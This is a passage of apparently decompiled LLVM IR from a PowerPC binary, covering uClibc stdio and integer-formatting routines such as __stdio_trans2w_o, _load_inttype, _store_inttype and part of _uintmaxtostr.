  store i32 %v2_1000ffac, i32* @r28, align 4
  store i32 %v2_1000ffac, i32* @r3, align 4
  store i32 268500924, i32* @lr, align 4
  %v3_1000ffb8 = call i32 @__GI_memchr(i32 %v2_1000ffac, i32 10, i32 %v0_1000ff88.v0_1000ff98)
  %v3_1000ffbc = icmp eq i32 %v3_1000ffb8, 0
  br i1 %v3_1000ffbc, label %dec_label_pc_10010024, label %dec_label_pc_1000ffc4

dec_label_pc_1000ffc4:                            ; preds = %dec_label_pc_1000ff94
  %v0_1000ffc4 = load i32, i32* @r30, align 4
  %v1_1000ffc4 = add i32 %v0_1000ffc4, 16
  %v2_1000ffc4 = inttoptr i32 %v1_1000ffc4 to i32*
  %v3_1000ffc4 = load i32, i32* %v2_1000ffc4, align 4
  %v0_1000ffc8 = load i32, i32* @r28, align 4
  %v1_1000ffc8 = load i32, i32* @r31, align 4
  %v2_1000ffc8 = sub i32 %v0_1000ffc8, %v3_1000ffb8
  %v2_1000ffcc = add i32 %v2_1000ffc8, %v1_1000ffc8
  %v2_1000ffd0 = sub i32 %v3_1000ffc4, %v2_1000ffcc
  %v1_1000ffd4 = load i32, i32* @r29, align 4
  %v2_1000ffd4 = sub i32 %v1_1000ffd4, %v2_1000ffcc
  store i32 %v2_1000ffd4, i32* @r29, align 4
  store i32 %v2_1000ffd0, i32* %v2_1000ffc4, align 4
  br label %dec_label_pc_10010024

dec_label_pc_1000ffe0:                            ; preds = %dec_label_pc_1000ff3c
  %v2_1000ffe0 = add i32 %tmp, 8
  %v3_1000ffe0 = inttoptr i32 %v2_1000ffe0 to i32*
  %v4_1000ffe0 = load i32, i32* %v3_1000ffe0, align 4
  %v4_1000ffe4 = icmp eq i32 %v4_1000fefc, %v4_1000ffe0
  br i1 %v4_1000ffe4, label %dec_label_pc_10010004, label %dec_label_pc_1000ffec

dec_label_pc_1000ffec:                            ; preds = %dec_label_pc_1000ffe0
  store i32 %tmp, i32* @r3, align 4
  store i32 268500980, i32* @lr, align 4
  %v0_1000fff0 = call i32 @__stdio_wcommit()
  %v3_1000fff4 = icmp eq i32 %v0_1000fff0, 0
  br i1 %v3_1000fff4, label %dec_label_pc_1000ffec.dec_label_pc_10010004_crit_edge, label %dec_label_pc_1000fffc

dec_label_pc_1000ffec.dec_label_pc_10010004_crit_edge: ; preds = %dec_label_pc_1000ffec
  %v0_10010008.pre = load i32, i32* @r30, align 4
  %v0_1001000c.pre = load i32, i32* @r28, align 4
  %v0_10010010.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010004

dec_label_pc_1000fffc:                            ; preds = %dec_label_pc_1000ffec
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10010024

dec_label_pc_10010004:                            ; preds = %dec_label_pc_1000ffec.dec_label_pc_10010004_crit_edge, %entry, %dec_label_pc_1000ffe0
  %v0_10010010 = phi i32 [ %v0_10010010.pre, %dec_label_pc_1000ffec.dec_label_pc_10010004_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1000ffe0 ]
  %v0_1001000c = phi i32 [ %v0_1001000c.pre, %dec_label_pc_1000ffec.dec_label_pc_10010004_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1000ffe0 ]
  %v0_10010008 = phi i32 [ %v0_10010008.pre, %dec_label_pc_1000ffec.dec_label_pc_10010004_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1000ffe0 ]
  %v1_10010008 = inttoptr i32 %v0_10010008 to i16*
  store i32 %v0_10010010, i32* @r5, align 4
  store i32 %v0_1000fed0, i32* @lr, align 4
  %v5_10010020 = call i32 @__stdio_WRITE(i16* %v1_10010008, i32 %v0_1001000c)
  br label %dec_label_pc_10010024

dec_label_pc_10010024:                            ; preds = %dec_label_pc_1000ff94, %dec_label_pc_1000ff84, %dec_label_pc_1000ff6c, %dec_label_pc_1000ff48, %dec_label_pc_1000fffc, %dec_label_pc_1000ffc4, %dec_label_pc_1000ff20, %dec_label_pc_10010004
  %v0_10010028 = load i32, i32* @r29, align 4
  ret i32 %v0_10010028

; uselistorder directives
  uselistorder i32 %v2_1000ffcc, { 1, 0 }
  uselistorder i32 %v0_1000ff88.v0_1000ff98, { 0, 2, 1 }
  uselistorder i32 %v0_1000ff94, { 1, 0, 2 }
  uselistorder i32 %v2_1000ff0c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10010024, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10010004, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ff20, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001003c = load i32, i32* @lr, align 4
  store i32 %v0_1001003c, i32* %r0.global-to-local, align 4
  %v0_10010044 = load i32, i32* @r31, align 4
  %v0_10010048 = load i32, i32* @r3, align 4
  store i32 %v0_10010048, i32* @r31, align 4
  %v1_10010050 = inttoptr i32 %v0_10010048 to i16*
  %v2_10010050 = load i16, i16* %v1_10010050, align 2
  %v3_10010050 = zext i16 %v2_10010050 to i32
  store i32 %v3_10010050, i32* %r0.global-to-local, align 4
  %v1_10010054 = load i32, i32* @r4, align 4
  %v2_10010054 = and i32 %v1_10010054, %v3_10010050
  store i32 %v2_10010054, i32* %r9.global-to-local, align 4
  %v5_10010054 = icmp eq i32 %v2_10010054, 0
  br i1 %v5_10010054, label %dec_label_pc_1001005c, label %dec_label_pc_1001006c

dec_label_pc_1001005c:                            ; preds = %entry
  %v1_1001005c = and i32 %v3_10010050, 2176
  store i32 %v1_1001005c, i32* %r9.global-to-local, align 4
  %v3_1001005c = icmp eq i32 %v1_1001005c, 0
  br i1 %v3_1001005c, label %dec_label_pc_10010064, label %dec_label_pc_10010078

dec_label_pc_10010064:                            ; preds = %dec_label_pc_1001005c
  %v2_10010064 = or i32 %v1_10010054, %v3_10010050
  store i32 %v2_10010064, i32* %r0.global-to-local, align 4
  %v1_10010068 = trunc i32 %v2_10010064 to i16
  store i16 %v1_10010068, i16* %v1_10010050, align 2
  %v0_1001006c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001006c

dec_label_pc_1001006c:                            ; preds = %entry, %dec_label_pc_10010064
  %v0_100100a8 = phi i32 [ %v0_10010048, %entry ], [ %v0_1001006c.pre, %dec_label_pc_10010064 ]
  %v1_1001006c = inttoptr i32 %v0_100100a8 to i16*
  %v2_1001006c = load i16, i16* %v1_1001006c, align 2
  %v3_1001006c = zext i16 %v2_1001006c to i32
  %v1_10010070 = and i32 %v3_1001006c, 32
  store i32 %v1_10010070, i32* %r0.global-to-local, align 4
  %v3_10010070 = icmp eq i32 %v1_10010070, 0
  br i1 %v3_10010070, label %dec_label_pc_10010098, label %dec_label_pc_10010078

dec_label_pc_10010078:                            ; preds = %dec_label_pc_1001005c, %dec_label_pc_1001006c
  %v0_10010078 = call i32 @__errno_location()
  store i32 %v0_10010078, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10010080 = inttoptr i32 %v0_10010078 to i32*
  store i32 9, i32* %v2_10010080, align 4
  br label %dec_label_pc_10010084

dec_label_pc_10010084:                            ; preds = %dec_label_pc_100100c0, %dec_label_pc_10010078
  %v0_10010084 = load i32, i32* @r31, align 4
  %v1_10010084 = inttoptr i32 %v0_10010084 to i16*
  %v2_10010084 = load i16, i16* %v1_10010084, align 2
  %v3_10010084 = zext i16 %v2_10010084 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1001008c = or i32 %v3_10010084, 8
  store i32 %v1_1001008c, i32* %r0.global-to-local, align 4
  %v1_10010090 = trunc i32 %v1_1001008c to i16
  store i16 %v1_10010090, i16* %v1_10010084, align 2
  br label %dec_label_pc_10010120

dec_label_pc_10010098:                            ; preds = %dec_label_pc_1001006c
  %tmp = urem i16 %v2_1001006c, 4
  %v1_10010098 = zext i16 %tmp to i32
  store i32 %v1_10010098, i32* %r0.global-to-local, align 4
  %v3_10010098 = icmp eq i16 %tmp, 0
  br i1 %v3_10010098, label %dec_label_pc_100100fc, label %dec_label_pc_100100a0

dec_label_pc_100100a0:                            ; preds = %dec_label_pc_10010098
  %v1_100100a0 = and i32 %v3_1001006c, 4
  store i32 %v1_100100a0, i32* %r9.global-to-local, align 4
  %v3_100100a0 = icmp eq i32 %v1_100100a0, 0
  br i1 %v3_100100a0, label %dec_label_pc_100100a8, label %dec_label_pc_100100e0

dec_label_pc_100100a8:                            ; preds = %dec_label_pc_100100a0
  %v1_100100a8 = add i32 %v0_100100a8, 20
  %v2_100100a8 = inttoptr i32 %v1_100100a8 to i32*
  %v3_100100a8 = load i32, i32* %v2_100100a8, align 4
  store i32 %v3_100100a8, i32* %r0.global-to-local, align 4
  %v1_100100ac = add i32 %v0_100100a8, 16
  %v2_100100ac = inttoptr i32 %v1_100100ac to i32*
  %v3_100100ac = load i32, i32* %v2_100100ac, align 4
  store i32 %v3_100100ac, i32* %r9.global-to-local, align 4
  %v4_100100b0 = icmp eq i32 %v3_100100a8, %v3_100100ac
  br i1 %v4_100100b0, label %dec_label_pc_100100b8, label %dec_label_pc_100100c0

dec_label_pc_100100b8:                            ; preds = %dec_label_pc_100100a8
  %v1_100100b8 = and i32 %v3_1001006c, 2
  store i32 %v1_100100b8, i32* %r0.global-to-local, align 4
  %v3_100100b8 = icmp eq i32 %v1_100100b8, 0
  br i1 %v3_100100b8, label %dec_label_pc_100100e0, label %dec_label_pc_100100c0

dec_label_pc_100100c0:                            ; preds = %dec_label_pc_100100a8, %dec_label_pc_100100b8
  %v1_100100c0 = and i32 %v3_1001006c, 1024
  store i32 %v1_100100c0, i32* %r9.global-to-local, align 4
  %v0_100100c8 = call i32 @__asm_mfcr()
  store i32 %v0_100100c8, i32* %r3.global-to-local, align 4
  %v1_100100cc = call i32 @__asm_rlwinm(i32 %v0_100100c8, i32 3, i32 31, i32 31)
  %v1_100100d0 = sub i32 2, %v1_100100cc
  store i32 %v1_100100d0, i32* @r5, align 4
  store i32 268501208, i32* @lr, align 4
  %v1_100100d4 = call i32 @__GI_fseek(i32 %v1_100100d0)
  store i32 %v1_100100d4, i32* %r3.global-to-local, align 4
  %v3_100100d8 = icmp eq i32 %v1_100100d4, 0
  br i1 %v3_100100d8, label %dec_label_pc_100100c0.dec_label_pc_100100e0_crit_edge, label %dec_label_pc_10010084

dec_label_pc_100100c0.dec_label_pc_100100e0_crit_edge: ; preds = %dec_label_pc_100100c0
  %v0_100100e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100100e0

dec_label_pc_100100e0:                            ; preds = %dec_label_pc_100100c0.dec_label_pc_100100e0_crit_edge, %dec_label_pc_100100a0, %dec_label_pc_100100b8
  %v0_100100e0 = phi i32 [ %v0_100100e0.pre, %dec_label_pc_100100c0.dec_label_pc_100100e0_crit_edge ], [ %v0_100100a8, %dec_label_pc_100100a0 ], [ %v0_100100a8, %dec_label_pc_100100b8 ]
  %v1_100100e0 = inttoptr i32 %v0_100100e0 to i16*
  %v2_100100e0 = load i16, i16* %v1_100100e0, align 2
  %v3_100100e0 = zext i16 %v2_100100e0 to i32
  store i32 %v3_100100e0, i32* %r0.global-to-local, align 4
  %v1_100100e4 = add i32 %v0_100100e0, 8
  %v2_100100e4 = inttoptr i32 %v1_100100e4 to i32*
  %v3_100100e4 = load i32, i32* %v2_100100e4, align 4
  store i32 %v3_100100e4, i32* %r9.global-to-local, align 4
  %v1_100100e8 = call i32 @__asm_rlwinm(i32 %v3_100100e0, i32 0, i32 0, i32 29)
  %v2_100100e8 = trunc i32 %v1_100100e8 to i16
  store i32 %v1_100100e8, i32* %r0.global-to-local, align 4
  %v3_100100ec = load i32, i32* @r31, align 4
  %v4_100100ec = inttoptr i32 %v3_100100ec to i16*
  store i16 %v2_100100e8, i16* %v4_100100ec, align 2
  %v0_100100f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100100f0 = load i32, i32* @r31, align 4
  %v2_100100f0 = add i32 %v1_100100f0, 20
  %v3_100100f0 = inttoptr i32 %v2_100100f0 to i32*
  store i32 %v0_100100f0, i32* %v3_100100f0, align 4
  %v0_100100f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100100f4 = load i32, i32* @r31, align 4
  %v2_100100f4 = add i32 %v1_100100f4, 24
  %v3_100100f4 = inttoptr i32 %v2_100100f4 to i32*
  store i32 %v0_100100f4, i32* %v3_100100f4, align 4
  %v0_100100f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100100f8 = load i32, i32* @r31, align 4
  %v2_100100f8 = add i32 %v1_100100f8, 16
  %v3_100100f8 = inttoptr i32 %v2_100100f8 to i32*
  store i32 %v0_100100f8, i32* %v3_100100f8, align 4
  %v0_100100fc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100100fc

dec_label_pc_100100fc:                            ; preds = %dec_label_pc_10010098, %dec_label_pc_100100e0
  %v2_10010108 = phi i32 [ %v0_100100a8, %dec_label_pc_10010098 ], [ %v0_100100fc.pre, %dec_label_pc_100100e0 ]
  %v1_100100fc = inttoptr i32 %v2_10010108 to i16*
  %v2_100100fc = load i16, i16* %v1_100100fc, align 2
  %v3_100100fc = zext i16 %v2_100100fc to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10010104 = or i32 %v3_100100fc, 64
  store i32 %v1_10010104, i32* %r0.global-to-local, align 4
  %v1_10010108 = trunc i32 %v1_10010104 to i16
  store i16 %v1_10010108, i16* %v1_100100fc, align 2
  %v0_1001010c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001010c = urem i32 %v0_1001010c, 65536
  store i32 %v1_1001010c, i32* %r0.global-to-local, align 4
  %v1_10010110 = and i32 %v0_1001010c, 2816
  store i32 %v1_10010110, i32* %r9.global-to-local, align 4
  %v3_10010110 = icmp eq i32 %v1_10010110, 0
  br i1 %v3_10010110, label %dec_label_pc_10010118, label %dec_label_pc_10010120

dec_label_pc_10010118:                            ; preds = %dec_label_pc_100100fc
  %v0_10010118 = load i32, i32* @r31, align 4
  %v1_10010118 = add i32 %v0_10010118, 12
  %v2_10010118 = inttoptr i32 %v1_10010118 to i32*
  %v3_10010118 = load i32, i32* %v2_10010118, align 4
  store i32 %v3_10010118, i32* %r0.global-to-local, align 4
  %v2_1001011c = add i32 %v0_10010118, 28
  %v3_1001011c = inttoptr i32 %v2_1001011c to i32*
  store i32 %v3_10010118, i32* %v3_1001011c, align 4
  br label %dec_label_pc_10010120

dec_label_pc_10010120:                            ; preds = %dec_label_pc_100100fc, %dec_label_pc_10010084, %dec_label_pc_10010118
  store i32 %v0_1001003c, i32* %r0.global-to-local, align 4
  store i32 %v0_10010044, i32* @r31, align 4
  %v0_10010130 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010130

; uselistorder directives
  uselistorder i32 %v0_1001010c, { 1, 0 }
  uselistorder i32 %v1_100100e8, { 1, 0 }
  uselistorder i32 %v0_100100e0, { 1, 0 }
  uselistorder i32 %v0_100100a8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_10010050, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 5, 6, 7, 8, 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10010120, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100100fc, { 1, 0 }
  uselistorder label %dec_label_pc_100100e0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100100c0, { 1, 0 }
  uselistorder label %dec_label_pc_10010078, { 1, 0 }
  uselistorder label %dec_label_pc_1001006c, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_10010134 = load i32, i32* @r5, align 4
  %v1_10010134 = icmp slt i32 %v0_10010134, 0
  %v1_10010138 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10010174 = icmp eq i32 %v1_10010138, 0
  br i1 %v1_10010134, label %dec_label_pc_10010174, label %dec_label_pc_10010140

dec_label_pc_10010140:                            ; preds = %entry
  br i1 %v3_10010174, label %dec_label_pc_10010148, label %dec_label_pc_1001017c

dec_label_pc_10010148:                            ; preds = %dec_label_pc_10010140
  %v3_10010148 = icmp eq i32 %arg1, 256
  br i1 %v3_10010148, label %dec_label_pc_10010154, label %dec_label_pc_1001015c

dec_label_pc_10010154:                            ; preds = %dec_label_pc_10010148
  br label %dec_label_pc_10010168

dec_label_pc_1001015c:                            ; preds = %dec_label_pc_10010148
  %v3_1001015c = icmp eq i32 %arg1, 512
  br i1 %v3_1001015c, label %dec_label_pc_10010164, label %dec_label_pc_10010168

dec_label_pc_10010164:                            ; preds = %dec_label_pc_1001015c
  br label %dec_label_pc_10010168

dec_label_pc_10010168:                            ; preds = %dec_label_pc_1001015c, %dec_label_pc_10010154, %dec_label_pc_10010164
  ret i32 0

dec_label_pc_10010174:                            ; preds = %entry
  br i1 %v3_10010174, label %dec_label_pc_10010188, label %dec_label_pc_1001017c

dec_label_pc_1001017c:                            ; preds = %dec_label_pc_10010140, %dec_label_pc_10010174
  %v2_1001017c = load i32, i32* %arg2, align 4
  ret i32 %v2_1001017c

dec_label_pc_10010188:                            ; preds = %dec_label_pc_10010174
  %v3_10010188 = icmp eq i32 %arg1, 256
  %v2_1001018c = load i32, i32* %arg2, align 4
  br i1 %v3_10010188, label %dec_label_pc_10010194, label %dec_label_pc_1001019c

dec_label_pc_10010194:                            ; preds = %dec_label_pc_10010188
  %v1_10010194 = urem i32 %v2_1001018c, 256
  br label %dec_label_pc_100101a8

dec_label_pc_1001019c:                            ; preds = %dec_label_pc_10010188
  %v3_1001019c = icmp eq i32 %arg1, 512
  br i1 %v3_1001019c, label %dec_label_pc_100101a4, label %dec_label_pc_100101a8

dec_label_pc_100101a4:                            ; preds = %dec_label_pc_1001019c
  %v1_100101a4 = mul i32 %v2_1001018c, 65536
  %v2_100101a4 = sdiv i32 %v1_100101a4, 65536
  br label %dec_label_pc_100101a8

dec_label_pc_100101a8:                            ; preds = %dec_label_pc_1001019c, %dec_label_pc_10010194, %dec_label_pc_100101a4
  %v0_100101a8 = phi i32 [ %v2_1001018c, %dec_label_pc_1001019c ], [ %v1_10010194, %dec_label_pc_10010194 ], [ %v2_100101a4, %dec_label_pc_100101a4 ]
  %tmp = icmp slt i32 %v0_100101a8, 0
  %v1_100101ac = zext i1 %tmp to i32
  %v2_100101ac = ashr i32 %v0_100101a8, 31
  %v3_100101ac = and i32 %v2_100101ac, -2
  %v4_100101ac = or i32 %v3_100101ac, %v1_100101ac
  ret i32 %v4_100101ac

; uselistorder directives
  uselistorder i32 %v0_100101a8, { 1, 0 }
  uselistorder i32 %v2_1001018c, { 2, 0, 1 }
  uselistorder i1 %v3_10010174, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_100101a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001017c, { 1, 0 }
  uselistorder label %dec_label_pc_10010168, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100101b4 = load i32, i32* @r4, align 4
  %v3_100101b4 = icmp eq i32 %v0_100101b4, 256
  br i1 %v3_100101b4, label %dec_label_pc_100101c0, label %dec_label_pc_100101c8

dec_label_pc_100101c0:                            ; preds = %entry
  %v0_100101c0 = load i32, i32* @r6, align 4
  %v1_100101c0 = trunc i32 %v0_100101c0 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_100101c0, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_100101c8:                            ; preds = %entry
  %v3_100101b8 = icmp eq i32 %v0_100101b4, 2048
  br i1 %v3_100101b8, label %dec_label_pc_100101d0, label %dec_label_pc_100101dc

dec_label_pc_100101d0:                            ; preds = %dec_label_pc_100101c8
  %v0_100101d0 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_100101d0, i32* %tmp2, align 4
  %v0_100101d4 = load i32, i32* @r6, align 4
  %v3_100101d4 = add i32 %tmp, 4
  %v4_100101d4 = inttoptr i32 %v3_100101d4 to i32*
  store i32 %v0_100101d4, i32* %v4_100101d4, align 4
  ret i32 %tmp

dec_label_pc_100101dc:                            ; preds = %dec_label_pc_100101c8
  %v3_100101c8 = icmp eq i32 %v0_100101b4, 512
  %v0_100101e0 = load i32, i32* @r6, align 4
  br i1 %v3_100101c8, label %dec_label_pc_100101e0, label %dec_label_pc_100101e8

dec_label_pc_100101e0:                            ; preds = %dec_label_pc_100101dc
  %v1_100101e0 = trunc i32 %v0_100101e0 to i16
  store i16 %v1_100101e0, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_100101e8:                            ; preds = %dec_label_pc_100101dc
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_100101e0, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100101f0 = load i32, i32* @r7, align 4
  %v3_100101f0 = icmp eq i32 %v0_100101f0, 0
  store i1 %v3_100101f0, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_100101f0, -1
  br i1 %tmp12, label %dec_label_pc_10010224, label %dec_label_pc_10010204

dec_label_pc_10010204:                            ; preds = %entry
  %v0_10010204 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010208 = sub i32 0, %v0_100101f0
  store i32 %v1_10010208, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_10010204, -1
  br i1 %tmp13, label %dec_label_pc_10010224, label %dec_label_pc_10010210

dec_label_pc_10010210:                            ; preds = %dec_label_pc_10010204
  %v0_10010210 = load i32, i32* %r6.global-to-local, align 4
  %v1_10010210 = sub i32 0, %v0_10010210
  %v2_10010210 = sub i32 -1, %v0_10010210
  store i32 %v1_10010210, i32* %r6.global-to-local, align 4
  %v4_10010210 = icmp uge i32 %v2_10010210, %v1_10010210
  %v1_10010214 = sub i32 -1, %v0_10010204
  %v3_10010214 = zext i1 %v4_10010210 to i32
  %v4_10010214 = add i32 %v3_10010214, %v1_10010214
  store i32 %v4_10010214, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010224

dec_label_pc_10010224:                            ; preds = %entry, %dec_label_pc_10010204, %dec_label_pc_10010210
  %v1_10010228 = phi i32 [ %v1_10010208, %dec_label_pc_10010210 ], [ %v1_10010208, %dec_label_pc_10010204 ], [ %v0_100101f0, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10010210 ], [ 0, %dec_label_pc_10010204 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10010228 = udiv i32 -1, %v1_10010228
  store i32 %v2_10010228, i32* @r8, align 4
  %v2_10010230 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010230 = inttoptr i32 %v2_10010230 to i8*
  store i8 0, i8* %v3_10010230, align 1
  %v0_10010234 = load i32, i32* @r8, align 4
  %v1_10010234 = load i32, i32* @r7, align 4
  %v2_10010234 = mul i32 %v1_10010234, %v0_10010234
  %v1_10010238 = sub i32 0, %v2_10010234
  store i32 %v1_10010238, i32* @r31, align 4
  %v4_1001023c = icmp eq i32 %v1_10010234, %v1_10010238
  br i1 %v4_1001023c, label %dec_label_pc_10010244, label %dec_label_pc_1001024c

dec_label_pc_10010244:                            ; preds = %dec_label_pc_10010224
  %v1_10010244 = add i32 %v0_10010234, 1
  store i32 %v1_10010244, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1001024c

dec_label_pc_1001024c:                            ; preds = %dec_label_pc_10010224, %dec_label_pc_10010244
  %v0_1001024c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1001024c, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_10010250

dec_label_pc_10010250thread-pre-split:            ; preds = %dec_label_pc_100102a4
  %v0_10010250.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_10010254.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10010250

dec_label_pc_10010250:                            ; preds = %dec_label_pc_10010250thread-pre-split, %dec_label_pc_1001024c
  %v1_10010298 = phi i32 [ %v1_10010254.pre, %dec_label_pc_10010250thread-pre-split ], [ %v1_10010234, %dec_label_pc_1001024c ]
  %v1_10010268 = phi i32 [ %v0_10010250.pr, %dec_label_pc_10010250thread-pre-split ], [ %v0_1001024c, %dec_label_pc_1001024c ]
  %v3_10010250 = icmp eq i32 %v1_10010268, 0
  %v0_10010254 = load i32, i32* %r6.global-to-local, align 4
  %v2_10010254 = udiv i32 %v0_10010254, %v1_10010298
  br i1 %v3_10010250, label %dec_label_pc_10010298, label %dec_label_pc_1001025c

dec_label_pc_1001025c:                            ; preds = %dec_label_pc_10010250
  %v2_1001025c = udiv i32 %v1_10010268, %v1_10010298
  %v2_10010260 = mul i32 %v2_1001025c, %v1_10010298
  %v2_10010264 = mul i32 %v2_10010254, %v1_10010298
  %v2_10010268 = sub i32 %v1_10010268, %v2_10010260
  store i32 %v2_1001025c, i32* %r12.global-to-local, align 4
  %v0_10010270 = load i32, i32* @r31, align 4
  %v2_10010270 = mul i32 %v0_10010270, %v2_10010268
  %v2_10010274 = sub i32 %v0_10010254, %v2_10010264
  %v2_10010278 = add i32 %v2_10010270, %v2_10010274
  %v0_1001027c = load i32, i32* @r8, align 4
  %v2_1001027c = mul i32 %v0_1001027c, %v2_10010268
  %v2_10010280 = udiv i32 %v2_10010278, %v1_10010298
  %v2_10010284 = add i32 %v2_1001027c, %v2_10010254
  %v2_10010288 = mul i32 %v2_10010280, %v1_10010298
  %v2_1001028c = add i32 %v2_10010284, %v2_10010280
  store i32 %v2_1001028c, i32* %r6.global-to-local, align 4
  %v2_10010290 = sub i32 %v2_10010278, %v2_10010288
  store i32 %v2_10010290, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100102a4

dec_label_pc_10010298:                            ; preds = %dec_label_pc_10010250
  %v2_10010298 = mul i32 %v2_10010254, %v1_10010298
  %v2_1001029c = sub i32 %v0_10010254, %v2_10010298
  store i32 %v2_1001029c, i32* %r5.global-to-local, align 4
  store i32 %v2_10010254, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100102a4

dec_label_pc_100102a4:                            ; preds = %dec_label_pc_1001025c, %dec_label_pc_10010298
  %v1_100102a8 = phi i32 [ %v2_1001025c, %dec_label_pc_1001025c ], [ 0, %dec_label_pc_10010298 ]
  %v0_100102a8 = phi i32 [ %v2_1001028c, %dec_label_pc_1001025c ], [ %v2_10010254, %dec_label_pc_10010298 ]
  %v0_100102ac = phi i32 [ %v2_10010290, %dec_label_pc_1001025c ], [ %v2_1001029c, %dec_label_pc_10010298 ]
  %v2_100102a8 = or i32 %v0_100102a8, %v1_100102a8
  %v5_100102a8 = icmp eq i32 %v2_100102a8, 0
  store i1 %v5_100102a8, i1* %cr0_eq.global-to-local, align 1
  %v1_100102b0 = load i32, i32* @r30, align 4
  %v0_100102b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100102b4 = add i32 %v0_100102b4, -1
  store i32 %v1_100102b4, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_100102ac, 10
  %v1_100102ac.v2_100102b0.v = select i1 %tmp14, i32 48, i32 %v1_100102b0
  %v1_100102ac.v2_100102b0 = add i32 %v0_100102ac, %v1_100102ac.v2_100102b0.v
  %extract.t9.extract.t = trunc i32 %v1_100102ac.v2_100102b0 to i8
  %v3_100102c4 = inttoptr i32 %v1_100102b4 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_100102c4, align 1
  %v0_100102c8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_100102c8, label %dec_label_pc_100102cc, label %dec_label_pc_10010250thread-pre-split

dec_label_pc_100102cc:                            ; preds = %dec_label_pc_100102a4
  %v0_100102cc = load i32, i32* @r29, align 4
  %v3_100102cc = icmp eq i32 %v0_100102cc, 0
  br i1 %v3_100102cc, label %dec_label_pc_100102cc.dec_label_pc_100102dc_crit_edge, label %dec_label_pc_100102d4

dec_label_pc_100102cc.dec_label_pc_100102dc_crit_edge: ; preds = %dec_label_pc_100102cc
  %v0_100102e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100102dc

dec_label_pc_100102d4:                            ; preds = %dec_label_pc_100102cc
  %v2_100102d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100102d8 = add i32 %v2_100102d8, -1
